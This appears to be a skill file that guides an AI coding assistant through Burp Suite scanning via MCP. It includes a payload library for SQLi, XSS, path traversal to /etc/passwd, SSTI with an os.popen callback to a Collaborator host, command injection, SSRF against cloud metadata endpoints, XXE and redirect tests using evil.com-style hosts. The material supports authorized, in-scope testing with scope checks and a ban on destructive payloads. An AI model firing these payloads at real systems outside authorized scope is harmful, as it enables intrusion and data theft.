---
name: burp-scan
description: Burp Suite scanning via MCP tools — passive traffic analysis, active payload testing, OOB verification, and vulnerability reporting using Burp's proxy, HTTP sender, Collaborator, and scanner APIs. Use when the user has Burp Suite running with the AI Agent MCP server and wants to scan, test, or analyze web traffic through an AI coding assistant (Claude Code, Gemini CLI, Codex, etc.).
---

# Burp Scan Skill

Tactical scanning engine for Burp Suite via MCP. Operates Burp's tools programmatically to discover, confirm, and report vulnerabilities.

> **AI LOAD INSTRUCTION**: Burp is the execution layer, not the decision layer - it sends what you
> tell it and reports what it observes. The core insight: an issue Burp flags is a *hypothesis* that
> becomes a finding only when you reproduce it with a hand-built request and show the impact. The
> most common mistake is reporting scanner output verbatim as a finding; a scanner's confidence is
> not evidence, and its false-positive rate on access-control and logic issues is high.

**Prerequisites**: Burp Suite running with the AI Agent extension loaded and MCP server enabled.

---

## 0. RELATED ROUTING

Load these alongside this skill; Burp is the transport, they are the technique:

- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - turning scanner output into a reportable finding
- [path-traversal-lfi](../path-traversal-lfi/SKILL.md) - file-access payloads to drive through the HTTP sender
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) - injection classes Burp scans for, with the confirming tests it omits
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - the reflected/stored classes where scanner output most often misleads
- [idor-broken-object-authorization/SKILL.md](../idor-broken-object-authorization/SKILL.md) - access-control issues Burp cannot decide without two accounts
- [recon-methodology](../recon-methodology/SKILL.md) - establishing scope before active testing

---

## 1. MCP TOOL REFERENCE

Tools organized by scanning action. Tools marked `[unsafe]` require Unsafe Mode enabled. Tools marked `[pro]` require Burp Professional.

### Discover Scope & Attack Surface

| Tool | Purpose |
|---|---|
| `scope_check` | Check if a URL is in scope |
| `site_map` | Browse Burp's site map |
| `site_map_regex` | Search site map by regex |
| `proxy_http_history` | List proxy HTTP history items |
| `proxy_http_history_regex` | Search proxy history by regex |
| `proxy_ws_history` | List WebSocket history |
| `proxy_ws_history_regex` | Search WebSocket history by regex |
| `response_body_search` | Regex search across all response bodies |

### Analyze Traffic

| Tool | Purpose |
|---|---|
| `params_extract` | Extract parameters from a request |
| `find_reflected` | Find reflected parameter values in a response |
| `insertion_points` | List insertion point offsets for a request |
| `request_parse` | Parse raw HTTP request into structured fields |
| `response_parse` | Parse raw HTTP response into structured fields |
| `diff_requests` | Line diff between two requests |

### Send Test Payloads

| Tool | Purpose |
|---|---|
| `http1_request` `[unsafe]` | Send HTTP/1.1 request through Burp and get response |
| `http2_request` `[unsafe]` | Send HTTP/2 request through Burp and get response |
| `repeater_tab` `[unsafe]` | Create a Repeater tab with a request |
| `repeater_tab_with_payload` `[unsafe]` | Create Repeater tab with placeholder replacement |
| `intruder` `[unsafe]` | Send request to Intruder |
| `intruder_prepare` `[unsafe]` | Create Intruder tab with explicit insertion points |

### Out-of-Band (OOB) Verification

| Tool | Purpose |
|---|---|
| `collaborator_generate` | Generate a Burp Collaborator payload (unique subdomain) |
| `collaborator_poll` | Poll for Collaborator interactions (DNS/HTTP callbacks) |

### Encoding & Utility

| Tool | Purpose |
|---|---|
| `url_encode` / `url_decode` | URL encoding/decoding |
| `base64_encode` / `base64_decode` | Base64 encoding/decoding |
| `hash_compute` | Hash text (MD5/SHA1/SHA256/SHA512) |
| `jwt_decode` | Decode JWT header + payload (no signature verification) |
| `decode_as` | Decompress content (gzip/deflate/brotli) |
| `cookie_jar_get` | Read Burp's cookie jar |
| `random_string` | Generate random strings |

### Report Findings

| Tool | Purpose |
|---|---|
| `issue_create` | Create a custom audit issue in Burp's issue list |
| `scanner_issues` `[pro]` | View existing scanner issues |

### Control Burp Scanner

| Tool | Purpose |
|---|---|
| `scan_audit_start` `[pro][unsafe]` | Start a Burp Scanner audit |
| `scan_crawl_start` `[pro][unsafe]` | Start a Burp Scanner crawl |
| `scan_task_status` `[pro]` | Get status of a scan task |

---

## 2. PASSIVE ANALYSIS PROTOCOL

Analyze proxy traffic WITHOUT sending additional requests. This is the first phase of any scan.

### Step 1: Pull Traffic

```
Use proxy_http_history or proxy_http_history_regex to retrieve in-scope traffic.
Filter: exclude static assets (.css, .js, .png, .jpg, .gif, .svg, .ico, .woff, .woff2, .ttf, .eot, .map).
Focus on: HTML, JSON, XML, text responses.
```

### Step 2: Local Pattern Checks (No AI Needed)

Run these deterministic checks on every request/response pair BEFORE any deeper analysis:

**Request Smuggling Indicators**:
- Both `Content-Length` and `Transfer-Encoding: chunked` present
- Multiple `Content-Length` headers with different values
- Severity: Medium, Confidence: 90

**CSRF Absence**:
- State-changing method (POST/PUT/PATCH/DELETE) + cookie-based auth (session/auth/token cookies)
- No CSRF token in parameters or headers, no Origin/Referer header
- No SameSite=Strict/Lax on auth cookies
- Severity: Low, Confidence: 85

**Deserialization Surface**:
- Parameters or body containing Java serialized data markers: `rO0AB` or `aced0005`
- Content-Type: `java-serialized` or `octet-stream` with serialized markers
- Severity: Information, Confidence: 90

**Unrestricted File Upload**:
- Multipart upload with dangerous extension (php, phtml, asp, aspx, jsp, jspx, cgi, py, rb, exe, dll)
- Response 2xx AND response references the uploaded filename
- Severity: Medium, Confidence: 90

### Step 3: Extract Context for Deep Analysis

For each request/response pair, extract:

1. **URL, Method, Status, MIME type**
2. **Request headers** (focus on: Authorization, Cookie, X-API-Key, Content-Type, Origin, Referer, Host, X-Forwarded-For/Host)
3. **Response headers** (focus on: Server, X-Powered-By, Set-Cookie, Access-Control-Allow-Origin, Content-Security-Policy, X-Frame-Options)
4. **Parameters** (name, value, type: URL/BODY/COOKIE/JSON)
5. **Potential Object IDs** in URL path or parameters (numeric IDs, UUIDs, MongoDB ObjectIds)
6. **Auth mechanisms** (session cookies vs Bearer token vs API key)
7. **Tech stack hints** (Server header, X-Powered-By, framework-specific headers)

### Step 4: Analysis Checklist

For each request/response pair, check for:

**Injection**: XSS, SQLi, CMDI, SSTI, SSRF, XXE, NoSQL injection, GraphQL injection
**Auth/Access Control**: IDOR/BOLA, BAC (horizontal/vertical), CSRF, JWT weaknesses
**Information Disclosure**: Secrets in responses, debug endpoints, source code exposure
**Configuration**: CORS misconfiguration, open redirect, missing security headers
**High-Value**: Account takeover paths, cache poisoning, request smuggling, host header injection
**API**: Version bypass, GraphQL introspection enabled

### Step 5: Severity Definitions

| Severity | Examples |
|---|---|
| **Critical** | RCE, authentication bypass, full account takeover |
| **High** | SQLi, stored XSS, SSRF with internal access, deserialization, command injection |
| **Medium** | Reflected XSS, IDOR/BOLA, CSRF on sensitive actions, open redirect, LFI |
| **Low** | Information disclosure, verbose errors, minor misconfigurations |

### DO NOT REPORT

- Missing security headers (CSP, X-Frame-Options, HSTS, X-Content-Type-Options) as standalone findings
- "Potential" issues without concrete evidence in the request/response
- Generic parameter reflection without XSS context (value echoed in non-executable context)
- Absence of rate limiting as a standalone vulnerability

### Step 6: JS Endpoint Discovery

When you encounter JavaScript files in proxy history, extract API endpoints using these patterns:

```
fetch("url"), axios.METHOD("url"), $.ajax({url:"..."}), XMLHttpRequest.open("METHOD","url")
"/api/...", "/v1/...", "/v2/...", endpoint="/...", "/segment/segment/..."
```

Exclude: `/css/`, `/js/`, `/img/`, `/static/`, `/assets/`, `/fonts/`, `/media/`, `/.well-known/`
Exclude extensions: .js, .css, .map, .png, .jpg, .svg, .ico, .woff, .pdf, .zip

Test discovered endpoints for access control issues (unauthenticated access, missing authorization).

---

## 3. ACTIVE TESTING PAYLOAD LIBRARY

Use payloads via `http1_request` to confirm passive findings. Always test against in-scope targets only.

### SQL Injection

**Error-based** (Detection: look for DB-specific error strings):
```
'
"
'--
';--
1'
\
```
Evidence patterns (95% confidence):
- MySQL: `You have an error in your SQL syntax`
- PostgreSQL: `ERROR: syntax error at or near`
- MSSQL: `Unclosed quotation mark after the character string`
- Oracle: `ORA-\d{4}:`
- SQLite: `SQLITE_ERROR` or `near "...": syntax error`

**Blind Boolean** (Detection: compare response differences):
```
1' AND '1'='1    (should return same as original)
1' AND '1'='2    (should return different/empty)
1 AND 1=1        (numeric context - same)
1 AND 1=2        (numeric context - different)
```
Protocol: Send BOTH true and false conditions. If true matches original and false differs -> confirmed.

**Time-based** (Detection: measure response delay >= 5 seconds):
```
1' AND SLEEP(5)--          (MySQL)
1'; WAITFOR DELAY '0:0:5'--  (MSSQL)
1' AND pg_sleep(5)--       (PostgreSQL)
```

**UNION-based** [MODERATE risk]:
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### XSS Reflected

Unique marker: `XSS-BURP-AI-1337` (check for this exact string in response)

```
<script>alert('XSS-BURP-AI-1337')</script>
<img src=x onerror=alert('XSS-BURP-AI-1337')>
<svg onload=alert('XSS-BURP-AI-1337')>
'"><script>alert('XSS-BURP-AI-1337')</script>
<body onload=alert('XSS-BURP-AI-1337')>
javascript:alert('XSS-BURP-AI-1337')
<ScRiPt>alert('XSS-BURP-AI-1337')</sCrIpT>
</script><script>alert('XSS-BURP-AI-1337')</script>
```
Confidence: 95% if marker reflected with intact tags. 75% if `alert(1)` reflected (needs manual check).

### LFI / Path Traversal

```
../../../etc/passwd                    (Linux - look for root:x:0:0)
....//....//....//etc/passwd           (filter bypass)
..%2f..%2f..%2fetc/passwd              (URL encoded)
..%252f..%252f..%252fetc/passwd        (double encoded)
/etc/passwd                            (absolute path)
file:///etc/passwd                     (file protocol)
..\..\..\\windows\\win.ini             (Windows - look for [fonts])
../../../etc/passwd%00                 (null byte)
....//....//....//etc/passwd%00.jpg    (extension bypass)
```
Evidence: `root:x:0:0:root:/root:` (95%) or `[fonts]` header (90%)

### SSTI (Server-Side Template Injection)

Unique math markers to avoid false positives:

```
{{1337*73}}          -> look for 97601 in response
{{31337*3}}          -> look for 94011 in response
{{7*'7'}}            -> look for 7777777 (Jinja2 specific)
${1337*73}           -> look for 97601 (Java EL, Spring)
<%= 1337*73 %>       -> look for 97601 (ERB/Ruby)
#{1337*73}           -> look for 97601 (Thymeleaf)
*{1337*73}           -> look for 97601 (Thymeleaf)
{{config}}           -> config dump (Jinja2)
{{request}}          -> request object leak (Jinja2)
{{''.__class__}}     -> Python class access [MODERATE]
```
Evidence: Math result `97601`, `94011`, or `7777777` in response (95% confidence).

### Command Injection

```
; id           -> look for uid=XXX(username) gid=XXX
| id           -> same
|| id          -> same
& id           -> same
&& id          -> same
`id`           -> same (backticks)
$(id)          -> same (command substitution)
| whoami       -> look for username output
; sleep 5      -> 5s delay (blind)
| sleep 5      -> 5s delay (blind)
```
Evidence: `uid=\d+\(\w+\) gid=\d+\(\w+\)` in response (95% confidence).

### SSRF

```
http://127.0.0.1
http://localhost
http://[::1]
http://127.0.0.1:22                          (SSH banner)
http://127.0.0.1:3306                        (MySQL)
http://169.254.169.254/latest/meta-data/     (AWS metadata) [MODERATE]
http://metadata.google.internal/computeMetadata/v1/  (GCP metadata) [MODERATE]
file:///etc/passwd
dict://127.0.0.1:11211/stats                 (Memcached)
gopher://127.0.0.1:6379/_INFO                (Redis)
```

### XXE

```xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>
```

### IDOR / BOLA (Context-Aware)

No static payloads. Generate based on original value:

**Numeric IDs**: Test `ID-1`, `ID+1`, `1` (first/admin), `0` (edge case), `-1` (negative)
**UUIDs**: Modify last character (`0`->`1` or vice versa)

Protocol: Compare response for original ID vs manipulated ID. If you get valid data for a different user's ID -> IDOR confirmed.

### Host Header Injection

Test marker: `evil-burp-ai-test.com`

```
Host: evil-burp-ai-test.com     -> check if reflected in response body or Location header
Host: localhost                  -> check if reflected
Host: 127.0.0.1                 -> check if reflected
```

### OAuth Misconfiguration

Test markers: `evil-burp-ai.com`

```
redirect_uri=https://evil-burp-ai.com/callback          (arbitrary redirect)
redirect_uri=https://legitimate.com.evil-burp-ai.com     (subdomain bypass)
redirect_uri=https://legitimate.com@evil-burp-ai.com     (@ bypass)
redirect_uri=https://legitimate.com%40evil-burp-ai.com   (encoded @ bypass)
```

### Open Redirect

```
//evil.com
https://evil.com
/\evil.com
////evil.com
https:evil.com
```
Evidence: `evil.com` in `Location` response header.

### Cache Poisoning

Test marker: `evil-burp-ai-cache.com`

```
X-Forwarded-Host: evil-burp-ai-cache.com    -> check if reflected in cached response body
```

### CORS Misconfiguration

Test via `Origin` header:
```
Origin: https://evil.com     -> check ACAO header reflects evil.com (95%)
Origin: null                 -> check ACAO: null (90%)
```

### Git/Backup Exposure

Append to base URL:
```
/.git/HEAD       -> look for "ref: refs/heads/"
/.git/config     -> look for "[core]"
/.git/index      -> look for "DIRC" magic bytes
/.svn/entries    -> look for "dir"
```

### Debug Endpoints

Append to base URL:
```
/actuator        /actuator/env     /actuator/health
/_profiler       /telescope        /__debug__
/phpinfo.php     /elmah.axd        /debug    /trace
```

### Price Manipulation

```
-1              (negative value)
0               (zero)
0.001           (near-zero)
999999999       (overflow)
-999999999      (large negative)
```

### Adaptive Payload Generation

When you know the target's tech stack (from Server/X-Powered-By headers or error patterns), generate technology-specific payloads. For example:
- Django + PostgreSQL -> PostgreSQL-specific SQLi syntax
- PHP + Apache -> PHP-specific LFI paths (`php://filter/...`)
- Node.js + Express -> NoSQL injection with MongoDB operators
- Java + Spring -> Spring EL injection (`${...}`)

Safety rule: NEVER generate destructive payloads containing: DROP, DELETE, TRUNCATE, ALTER, GRANT, REVOKE, SHUTDOWN, rm -, FORMAT, DESTROY.

---

## 4. SCANNING WORKFLOW

### Phase 1: Scope & Reconnaissance

```
1. scope_check on target URL
2. site_map to understand application structure
3. proxy_http_history to review captured traffic
4. Identify tech stack from response headers (Server, X-Powered-By)
5. Identify auth mechanism (cookies vs tokens vs API keys)
```

### Phase 2: Passive Analysis

```
1. For each in-scope request/response:
   a. Run local pattern checks (Section 2, Step 2)
   b. Extract context (Section 2, Step 3)
   c. Analyze against checklist (Section 2, Step 4)
   d. Flag potential vulns with evidence

2. JS endpoint discovery:
   a. Find JS files via proxy_http_history_regex with pattern "\.js$"
   b. Extract API endpoints from JS content
   c. Test discovered endpoints for auth issues
```

### Phase 3: Active Confirmation

For each passive finding, confirm with active testing:

```
1. Select payloads from Section 3 based on vuln class
2. Send original request via http1_request (baseline)
3. Send modified request with payload via http1_request
4. Analyze response:

   ERROR_BASED:    Search for error pattern strings in response body
   REFLECTION:     Search for unique marker (XSS-BURP-AI-1337, etc.) in response
   CONTENT_BASED:  Search for expected file content (root:x:0:0, [fonts], 97601)
   BLIND_BOOLEAN:  Send true+false conditions, compare response body/length
   BLIND_TIME:     Measure response time, confirm >= 5000ms delay
   OUT_OF_BAND:    Use collaborator_generate, inject payload, then collaborator_poll

5. Confidence thresholds:
   - >= 95%: CERTAIN  (report immediately)
   - >= 85%: FIRM     (report with evidence)
   - >= 70%: TENTATIVE (investigate further before reporting)
   - < 70%:  DO NOT REPORT
```

### Phase 4: OOB Testing (for blind vulnerabilities)

```
1. collaborator_generate -> get unique subdomain (e.g., xyz.burpcollaborator.net)
2. Inject Collaborator payload in test:
   - SSRF: http://xyz.burpcollaborator.net
   - XXE:  <!ENTITY xxe SYSTEM "http://xyz.burpcollaborator.net">
   - CMDI: ; nslookup xyz.burpcollaborator.net
   - SSTI: {{config.__class__.__init__.__globals__['os'].popen('nslookup xyz.burpcollaborator.net')}}
3. Wait 5-10 seconds
4. collaborator_poll -> check for DNS/HTTP interactions
5. If interactions found -> vulnerability confirmed
```

### Phase 5: Knowledge Tracking

Track per-host information across the scan to improve payload selection:

```
Tech Stack:     Server header, X-Powered-By, X-ASPNet-Version, X-Generator
Auth Info:      Session cookies (session, auth, token, sid, jwt, remember)
                Bearer tokens (Authorization header)
                API keys (X-API-Key, X-Auth-Token)
Error Patterns: Database errors, stack traces, framework exceptions
Prior Findings: What vuln classes were already found on which endpoints
```

Use tech stack knowledge to prioritize:
- Django detected -> test SSTI with `{{...}}`, SQLi with PostgreSQL syntax
- PHP detected -> test LFI with `php://filter`, deserialize with `O:` prefix
- Java detected -> test SSTI with `${...}`, deserialize with `rO0AB`
- .NET detected -> test path traversal with backslashes, VIEWSTATE tampering

---

## 5. ISSUE CREATION PROTOCOL

When a vulnerability is confirmed (confidence >= 85%), create a Burp audit issue:

### issue_create Parameters

```json
{
  "name": "[Vuln Type] - [Specific Detail]",
  "detail": "Full description with evidence...",
  "baseUrl": "https://target.com/path",
  "severity": "HIGH|MEDIUM|LOW|INFORMATION",
  "confidence": "CERTAIN|FIRM|TENTATIVE",
  "remediation": "Mitigation advice...",
  "httpRequest": "GET /path HTTP/1.1\r\nHost: target.com\r\n...",
  "httpResponseContent": "HTTP/1.1 200 OK\r\n...",
  "targetHostname": "target.com",
  "targetPort": 443,
  "usesHttps": true
}
```

### Severity Mapping

| Severity | Vulnerability Classes |
|---|---|
| **HIGH** | SQLi, CMDI, SSTI, XXE, RFI, Deserialization, Request Smuggling, Account Takeover, MFA Bypass, OAuth Misconfiguration, Git Exposure, Subdomain Takeover, Host Header Injection, Cache Poisoning, LDAP Injection, NoSQL Injection, XPath Injection |
| **MEDIUM** | XSS (Reflected/Stored/DOM), LFI, SSRF, IDOR/BOLA, Path Traversal, BAC (Horizontal/Vertical), BFLA, Mass Assignment, Auth Bypass, Session Fixation, GraphQL Injection, Stack Trace Exposure, Sourcemap Disclosure, Backup Disclosure, Debug Exposure, S3 Misconfiguration, Cache Deception, Price Manipulation, Race Condition TOCTOU, File Upload, Access Control Bypass, Email Header Injection, API Version Bypass |
| **LOW** | Open Redirect, Header/CRLF Injection, JWT Weakness, Race Condition, Business Logic, CORS Misconfiguration, Directory Listing, Debug Endpoint, Version Disclosure, Missing Security Headers, Verbose Error, Insecure Cookie, Sensitive Data in URL, Weak Crypto, Log Injection, CSRF, Rate Limit Bypass, Weak Session Token |

### Confidence Mapping

| Confidence | Criteria |
|---|---|
| **CERTAIN** | >= 95% confidence, clear evidence (error string, file content, math result) |
| **FIRM** | >= 85% confidence, strong evidence (response difference, reflection with context) |
| **TENTATIVE** | >= 70% confidence, circumstantial evidence (needs manual verification) |

### Remediation Reference

| Vuln Class | Remediation |
|---|---|
| SQLi | Use parameterized queries or prepared statements. Never concatenate user input into SQL queries. |
| XSS | Encode all user input before rendering in HTML. Use Content-Security-Policy headers. |
| LFI/Path Traversal | Validate and sanitize file paths. Use allowlists for permitted files. |
| SSTI | Use logic-less templates or sandbox template execution. Never pass user input directly to template engines. |
| CMDI | Avoid system commands with user input. Use strict allowlists and proper escaping. |
| SSRF | Validate and allowlist destination URLs. Block requests to internal networks and cloud metadata endpoints. |
| IDOR/BOLA | Implement proper authorization checks. Don't rely on obscurity of IDs. |
| XXE | Disable external entity processing in XML parsers. Use JSON instead of XML where possible. |
| CORS | Use explicit allowlist for origins. Never reflect arbitrary origins. Avoid wildcard with credentials. |
| Open Redirect | Validate redirect URLs against an allowlist. Use relative URLs where possible. |
| JWT | Use strong algorithms (RS256). Validate all JWT claims. Don't accept 'none' algorithm. |
| CSRF | Implement anti-CSRF tokens. Use SameSite cookies and verify Origin/Referer on state-changing requests. |
| Host Header Injection | Validate Host header against allowlist. Don't use Host header in password reset URLs or cache keys. |
| Cache Poisoning | Don't use unkeyed headers in cached responses. Validate all header inputs. |
| OAuth | Strictly validate redirect_uri against exact match allowlist. Use state parameter with unpredictable values. |
| File Upload | Restrict file types, validate content, store outside web root, enforce random names. |
| Request Smuggling | Normalize or reject conflicting Content-Length/Transfer-Encoding headers. Use a single HTTP parser. |
| Deserialization | Avoid deserializing untrusted data. Use allowlists for permitted classes. |

---

## 6. VULNERABILITY CLASSES REFERENCE

### 62 Classes by OWASP Category

**A01 - Broken Access Control**: IDOR, BOLA, BFLA, BAC_HORIZONTAL, BAC_VERTICAL, MASS_ASSIGNMENT, SSRF, CORS_MISCONFIGURATION, DIRECTORY_LISTING

**A02 - Security Misconfiguration**: DEBUG_ENDPOINT, STACK_TRACE_EXPOSURE, VERSION_DISCLOSURE, MISSING_SECURITY_HEADERS, VERBOSE_ERROR

**A04 - Cryptographic Failures**: INSECURE_COOKIE, SENSITIVE_DATA_URL, WEAK_CRYPTO

**A05 - Injection**: SQLI, XSS_REFLECTED, XSS_STORED, XSS_DOM, CMDI, SSTI, XXE, LDAP_INJECTION, XPATH_INJECTION, NOSQL_INJECTION, GRAPHQL_INJECTION, LOG_INJECTION, LFI, RFI, PATH_TRAVERSAL, HOST_HEADER_INJECTION, EMAIL_HEADER_INJECTION

**A06 - Insecure Design**: BUSINESS_LOGIC, RATE_LIMIT_BYPASS, PRICE_MANIPULATION, RACE_CONDITION_TOCTOU

**A07 - Authentication Failures**: JWT_WEAKNESS, AUTH_BYPASS, SESSION_FIXATION, WEAK_SESSION_TOKEN, ACCOUNT_TAKEOVER, OAUTH_MISCONFIGURATION, MFA_BYPASS

**A08 - Integrity Failures**: DESERIALIZATION, REQUEST_SMUGGLING, CSRF, UNRESTRICTED_FILE_UPLOAD

**Cache Attacks**: CACHE_POISONING, CACHE_DECEPTION

**Information Disclosure**: SOURCEMAP_DISCLOSURE, GIT_EXPOSURE, BACKUP_DISCLOSURE, DEBUG_EXPOSURE

**Cloud/Infrastructure**: S3_MISCONFIGURATION, SUBDOMAIN_TAKEOVER

**API Security**: API_VERSION_BYPASS

**Access Control**: ACCESS_CONTROL_BYPASS

**Other**: OPEN_REDIRECT, HEADER_INJECTION, CRLF_INJECTION, RACE_CONDITION

### Scan Modes

| Mode | Classes Included |
|---|---|
| **BUG_BOUNTY** | High-impact only: SQLi, XSS, SSRF, CMDI, SSTI, XXE, IDOR, BOLA, BAC, BFLA, Auth Bypass, OAuth, MFA Bypass, ATO, Host Header Injection, Cache Poisoning/Deception, Open Redirect, Price Manipulation, Race Condition TOCTOU, Access Control Bypass |
| **PENTEST** | All active-testable classes (excludes passive-only) |
| **FULL** | All 62 vulnerability classes |

### Passive-Only Classes (No Active Payloads)

These are detected through traffic analysis only, not payload injection:
CORS_MISCONFIGURATION, MISSING_SECURITY_HEADERS, VERSION_DISCLOSURE, INSECURE_COOKIE, REQUEST_SMUGGLING, CSRF, UNRESTRICTED_FILE_UPLOAD, DESERIALIZATION, SUBDOMAIN_TAKEOVER, S3_MISCONFIGURATION, SOURCEMAP_DISCLOSURE, GIT_EXPOSURE, BACKUP_DISCLOSURE, DEBUG_EXPOSURE

### Impact Context Multipliers

Findings have higher impact when they affect:
- **Auth endpoints** (`/login`, `/signin`, `/auth`, `/password`, `/reset`, `/oauth`, `/sso`, `/2fa`): +30%
- **Payment flows** (`/checkout`, `/payment`, `/cart`, `/order`, `/purchase`, `/billing`): +40%
- **Admin panels** (`/admin`, `/dashboard`, `/manage`, `/control`, `/settings`, `/internal`): +30%
- **PII data** (email, phone, address, SSN, credit card in response): +20%
- **API endpoints** (`/api/`, `/v1/`, `/v2/`, `/graphql`, JSON response): +10%

---

## FALSE POSITIVE INDICATORS

Do NOT report if these are present:

**SQL Injection false positives**:
- Error is in a comment or documentation text
- Error string matches but is inside a `<code>` or `<pre>` block
- Error is from a WAF/security product, not the actual database

**XSS false positives**:
- Payload reflected inside a JavaScript string but properly escaped
- Payload reflected in HTML attribute but URL-encoded
- Payload in Content-Type that is not text/html (e.g., application/json)
- Response has Content-Type: application/json with no HTML rendering context

**LFI false positives**:
- Response contains "root" but not the full passwd format
- Response is a custom error page mentioning the word "passwd"

**SSTI false positives**:
- The number 97601 appears in legitimate content (e.g., product IDs, timestamps)
- Template syntax is reflected but not evaluated (literal `{{1337*73}}` in response)

---

## DESTRUCTIVE PAYLOAD SAFETY

NEVER use or generate payloads containing these patterns:
```
DROP, DELETE, TRUNCATE, ALTER, GRANT, REVOKE, SHUTDOWN
EXEC xp_, rm -, FORMAT, DESTROY
```

All scanning MUST target in-scope assets only. Always verify scope with `scope_check` before active testing.

---

## 7. CONFIRMING THE FINDING — SCANNER OUTPUT IS A LEAD
Burp's scanner and active payloads produce **hypotheses**. This section is the gate between a
scanner hit and a reportable finding - it is the step that most automated workflows skip, and the
reason scanner-derived reports get rejected.

| Step | Question | What it proves |
|---|---|---|
| 1 | Can you **reproduce** it with a hand-built request outside the scanner? | the scanner is not having a parsing artefact |
| 2 | Does the **response differ** from a control request that differs only in the payload? | causality, not coincidence |
| 3 | Is the evidence **in the response you captured**, not in the scanner's assertion? | scanners summarise; the raw pair is the evidence |
| 4 | For access control: does it hold with **two accounts you own**, with the roles recorded? | Burp cannot decide authorization without a second identity |
| 5 | For injection: did you **confirm with the OOB interaction** in the Collaborator, and is the interaction correlated to your payload? | blind classes need the callback, not a timing guess |
| 6 | Is the issue **in scope** and on a **production-equivalent** host? | scanning a staging host with different config wastes a report |
| 7 | What is the **impact** in one sentence, with the data or action reached? | scanner output has no impact statement; you must supply it |

**Scanner confidence is not evidence.** A `Firm` confidence on an access-control or business-logic
issue is a heuristic guess; on a reflective XSS it may be a hit inside a context that never executes.
Reproduce every issue you intend to report with the HTTP sender, and capture the request/response
pair yourself.

**OOB findings must be correlated, not merely present.** A Collaborator interaction proves an
outbound request happened; it becomes a finding when the interaction carries a token unique to your
payload, from the exact target, at the time of your request. Uncorrelated interactions are the most
common Burp false positive.

**Access control needs two identities.** Burp has no notion of "another user's object". You must
supply Account A and Account B, then show A reading or modifying B's resource. State which account
owned the object and which token was used.

---

## 8. EVIDENCE STANDARD

| Item | Why |
|---|---|
| The **raw request and response** from the HTTP sender, not the scanner's issue panel | the scanner's summary is not the artefact; the byte pair is |
| The **control request/response** differing only in the injected payload | establishes causality and is the first thing triage checks |
| For OOB: the **Collaborator interaction** with the unique payload token, timestamp, and source IP | proves the callback belongs to your request |
| For access control: both **accounts, tokens, and the object ownership** | authorization findings are unverifiable without the second identity |
| The **scope reference** covering the host, and confirmation the host is production-equivalent | out-of-scope and staging-only findings are rejected |
| The **issue class and the exact endpoint/parameter** | a scanner finding without the parameter is unactionable |
| The **reproduction steps** as a numbered, tool-independent sequence | lets the fix owner reproduce without Burp |
| Payload **safety classification** (safe vs destructive) and confirmation it ran only in scope | destructive payloads against live data create incidents, not findings |
| **Negative control** - the same request with a benign value returns the normal result | rules out a broken endpoint or a catch-all handler |

Report the **reproduced mechanism and the impact**: "`GET /api/invoices/1042` with Account A's token
returns Account B's invoice PDF (id 1042 is owned by B, confirmed by requesting it with B's token);
the scanner flagged it `Firm`, and the pair above is the manual reproduction", never "Burp reported
an IDOR".

### False positives - do not report these

| Observation | Why it is not a finding |
|---|---|
| Scanner issue not reproducible with a manual request | scanner parsing artefact |
| Collaborator interaction with no unique token correlating it to your payload | background traffic or another tester |
| OOB callback from a different host than the target | your own resolver, a proxy, or a CDN beacon |
| "Client-side" issue Burp raises from a reflected string in a non-executing context | reflection, not execution |
| Access-control issue where the object is actually **public** or owned by the caller | no boundary crossed |
| Issue on a **staging** host with different configuration | not the production system; verify before reporting |
| `Firm` confidence on a business-logic or race issue | heuristics cannot decide these; reproduce manually |
| Timeout or `500` from a scanner payload | the endpoint broke; not proof of injection |
| Scanner flags a cookie attribute on a non-session cookie | no security impact |
| Duplicate issues across many parameters of one endpoint | one finding, not ten; deduplicate |
| Destructive payload (`DROP`, `DELETE`) causing a change | that is an incident; report only safe, in-scope tests |

**If you cannot reproduce it outside the scanner, do not report it.** The reproduction is the
finding; the scanner merely pointed at the endpoint.

---

## 9. REMEDIATION REFERENCE

*Remediation for scanner-driven findings is the fix for the underlying class; this section covers
the workflow controls that make scanner output trustworthy, plus the classes Burp most often gets
wrong.*

1. **Verify every issue manually before reporting** - default to a triage step where a human or an agent reproduces the issue with the HTTP sender and attaches the raw pair; a scanner queue is a worklist, not a report.
2. **Correlate every OOB interaction to a unique token and the target host** - generate a per-payload token, log the timestamp and source, and discard interactions that cannot be tied to a specific request; this removes the largest false-positive class.
3. **Supply a second identity for all access-control testing** - configure Account A and Account B with distinct roles, and require the object ownership to be stated in the finding; Burp cannot infer authorization on its own.
4. **Classify payloads as safe or destructive and gate destructive ones** - block `DROP`/`DELETE`/`TRUNCATE` and equivalent payloads outside a dedicated test dataset, and require explicit authorization for any payload that mutates state.
5. **Scan the correct environment** - confirm the host is production-equivalent before active testing; issues found only on a differently configured staging host are usually not reproducible in production.
6. **Configure scope before any active scan, and enforce it at the tool level** - a scope list in the project file plus a pre-flight `scope_check` prevents out-of-scope traffic and the resulting rejected reports.
7. **Tune the scanner to the application before trusting it** - record a login macro, configure session handling, and seed the scanner with authenticated traffic; an unauthenticated scanner sees a fraction of the surface and produces shallow issues.
8. **Deduplicate by root cause, not by URL** - collapse the same defect across many parameters into one finding with an example and an affected list; this is what triage expects and it keeps severity accurate.
9. **Keep the payload library current and versioned** - review Burp's active payloads and your custom library on a schedule, and remove payloads that cause instability or duplicate coverage.
10. **Log what was scanned, when, and with what configuration** - a run record lets you show coverage, avoid rescanning, and defend a "no findings" claim; unrecorded scans are not evidence of testing.
11. **Route scanner findings into the same evidence standard as manual work** - the reporting bar must not depend on how the issue was discovered; scanner-derived findings that skip the evidence tables tend to be the ones rejected.

---

## 10. RELATED SIBLINGS — SCANNER WORKFLOW CONTEXT

- [security-reporting-and-documentation](../security-reporting-and-documentation/SKILL.md) - converting scanner output into a reportable finding
- [recon-methodology](../recon-methodology/SKILL.md) - establishing scope before any active scan
- [idor-broken-object-authorization](../idor-broken-object-authorization/SKILL.md) - the class Burp cannot decide without a second account
- [sqli-sql-injection](../sqli-sql-injection/SKILL.md) - injection classes with the confirming tests the scanner omits
- [xss-cross-site-scripting](../xss-cross-site-scripting/SKILL.md) - where reflected scanner hits most often mislead

---

## 11. SCANNER CANDIDATE TRIAGE

